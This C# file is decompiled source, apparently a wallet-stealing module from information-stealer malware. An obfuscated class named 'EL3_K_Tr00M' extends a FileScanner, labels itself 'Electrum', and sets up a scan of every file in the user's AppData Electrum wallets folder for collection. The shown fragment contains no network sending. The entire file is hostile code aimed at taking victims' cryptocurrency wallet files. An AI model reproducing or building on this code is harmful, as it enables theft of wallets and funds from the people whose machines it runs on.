using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000023 RID: 35
public class EL3_K_Tr00M : FileScanner
{
	// Token: 0x060000C3 RID: 195 RVA: 0x000038AF File Offset: 0x00001AAF
	public EL3_K_Tr00M()
	{
		base.Name = "Electrum";
	}

	// Token: 0x060000C4 RID: 196 RVA: 0x00003779 File Offset: 0x00001979
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x060000C5 RID: 197 RVA: 0x00008ACC File Offset: 0x00006CCC
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets";
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = new string(new char[]
				{
					'*'
				}),
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
